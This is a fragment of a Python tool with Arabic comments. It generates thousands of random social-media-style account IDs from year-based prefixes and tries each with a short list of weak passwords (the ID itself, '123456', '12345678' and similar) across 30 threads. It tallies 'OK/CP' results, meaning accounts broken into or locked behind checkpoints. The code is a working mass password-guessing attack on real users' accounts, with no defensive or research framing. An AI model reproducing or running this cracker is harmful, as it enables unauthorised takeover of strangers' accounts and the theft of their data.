...
def pak():
    users = []
    clear()
    print('\033[1;31m Example of years: 2009, 2011, 2020')
    try:
        year = int(input('\033[1;37m Enter the year: ').strip())
        if year < 2000 or year > 2024:  # التحقق من أن السنة منطقية
            raise ValueError("Year out of range.")
    except ValueError as e:
        print(f"Invalid year: {e}. Defaulting to 2011.")
        year = 2011

    # تحديد البادئة بناءً على السنة
    prefixes = {
        2009: "100000",
        2010: "100000",
        2011: "10000",
    ...
    prefix = prefixes.get(year, "10000")  # إذا لم تُحدد السنة، تُستخدم بادئة افتراضية

    try:
        limit = int(input('\033[1;31m Example: 2000, 3000, 5000, 10000\n\033[1;37m Enter limit: ').strip())
    except ValueError:
        print("Invalid input. Setting limit to 5000 by default.")
        limit = 5000

    # إنشاء المستخدمين
    for _ in range(limit):
        # إنشاء أرقام عشوائية لتكملة المعرفات إلى 14 رقمًا
        random_digits = ''.join(random.choice(string.digits) for _ in range(14 - len(prefix)))
        users.append(prefix + random_digits)

    # استخدام ThreadPool لتحسين الأداء
    with ThreadPoolExecutor(max_workers=30) as executor:
        clear()
        total_users = len(users)
        print(f'Total accounts: \033[1;32m{total_users}')
        print(f'\033[1;37m Year chosen: \033[1;32m{year}')
        print(f'\033[1;37m Use flight mode for speed up\033[1;97m')
        linex()

        for user in users:
            ids = user
            passlist = [
                user, ids, '123456', '1234567', '12345678', 
                '123456789', '1234567890', '123123', '112233', 
                '123321', '11223344', '12344321'
            ]
            executor.submit(rndm, ids, passlist)

    print('\033[1;37m')
    linex()
    print('The process has completed')
    print(f'Total OK/CP: {len(oks)}/{len(cps)}')  # يجب تعريف `oks` و `cps` إذا كانت مستخدمة
    linex()
